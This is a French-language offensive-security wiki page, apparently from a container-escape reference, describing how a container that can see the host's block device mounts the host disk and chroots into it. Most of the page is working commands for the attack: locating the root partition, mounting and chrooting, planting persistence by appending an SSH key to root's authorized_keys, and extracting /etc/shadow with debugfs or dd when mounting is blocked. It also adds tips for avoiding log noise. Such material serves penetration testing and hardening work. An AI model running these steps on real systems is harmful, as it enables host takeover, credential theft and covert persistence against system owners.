---
title: "Périphérique bloc de l'hôte : monter le disque de l'hôte depuis l'intérieur d'un conteneur"
description: "Un conteneur qui peut voir le nœud de périphérique bloc de l'hôte (par exemple /dev/sda ou /dev/nvme0n1) et détient CAP_SYS_ADMIN peut monter le système de fichiers racine de l'hôte et y effectuer chroot, obtenant un accès complet en lecture-écriture à chaque fichier de l'hôte. C'est l'évasion de conteneur interactive la plus rapide lorsque des périphériques bloc bruts sont exposés."
keywords:
  - périphérique bloc de l'hôte
  - monter le disque de l'hôte
  - évasion par chroot
  - nvme sda
  - évasion de conteneur
---

# Périphérique bloc de l'hôte

Lorsque le nœud de périphérique bloc de l'hôte est visible à l'intérieur du conteneur et que le processus peut monter, le conteneur lit et écrit le vrai système de fichiers de l'hôte. Le nœud de périphérique pointe vers le pilote du disque de l'hôte, de sorte que le monter expose le système de fichiers racine réel plutôt qu'une quelconque copie du conteneur. C'est l'évasion interactive la plus directe : montez, `chroot`, et vous êtes root sur le système de fichiers de l'hôte.

Identifiez le périphérique et son système de fichiers :

```bash
lsblk -f 2>/dev/null                    # device, FSTYPE, and existing mountpoint
cat /proc/partitions                    # major/minor and size if lsblk is absent
fdisk -l 2>/dev/null | grep -E 'Linux|/dev/(sd|nvme|vd)'
```

La racine de l'hôte est généralement la plus grande partition avec un système de fichiers `ext4`/`xfs`/`btrfs`, par exemple `/dev/sda1`, `/dev/nvme0n1p2`, ou un nœud mapper LVM comme `/dev/mapper/vg0-root`.

## Monter et chroot

```bash
mkdir -p /mnt/host
mount /dev/nvme0n1p2 /mnt/host          # mount the host root filesystem
chroot /mnt/host /bin/bash              # become root in the host's file view
# persist: add an SSH key, a systemd unit, or a sudoers entry
echo 'ssh-ed25519 AAAA... a' >> /mnt/host/root/.ssh/authorized_keys
```

Pour les racines sur LVM, device-mapper ou RAID, la cible est le nœud mapper ; `lsblk -f` montre quel nœud porte le système de fichiers racine et son point de montage. Pour une racine btrfs, vous pouvez avoir besoin de `-o subvol=@` pour atterrir sur le bon sous-volume.

## Quand mount est bloqué

Le montage nécessite `CAP_SYS_ADMIN` et un appel système `mount` non filtré. Si la capacité est présente mais qu'un profil seccomp bloque `mount`, cette voie échoue ; confirmez avec un `mount -t tmpfs none /mnt` jetable. Si seul le périphérique est présent sans la capacité, lisez plutôt le périphérique brut :

```bash
# carve files directly from the raw device without mounting
dd if=/dev/nvme0n1p2 bs=1M count=64 2>/dev/null | strings | grep -i 'root:.*:0:0'
debugfs -R 'cat /etc/shadow' /dev/nvme0n1p2 2>/dev/null   # ext4 read without mount
```

## Notes d'exploitation

- Des nœuds de périphérique bloc visibles signifient presque toujours `--privileged` ou un `--device` explicite ; le `devices.list` du cgroup de périphériques confirme ce qui est autorisé.
- Monter en lecture-écriture vous permet d'implanter une persistance ; si vous n'avez besoin que de secrets, un montage en lecture seule ou l'extraction par `debugfs`/`dd` évite de modifier l'état de l'hôte et le bruit de journalisation.
- Cette voie se marie avec [CAP_SYS_ADMIN](../capability-abuse/cap-sys-admin.md) pour le montage et recoupe la voie du disque de l'hôte de [Flag privileged](../privileged-flag.md).

## Outils

- [debugfs (accès hors ligne ext2/3/4, intégré à e2fsprogs)](https://e2fsprogs.sourceforge.net/)

## Références

- [man 8 mount](https://man7.org/linux/man-pages/man8/mount.8.html)
- [HackTricks : Docker breakout / privileged](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
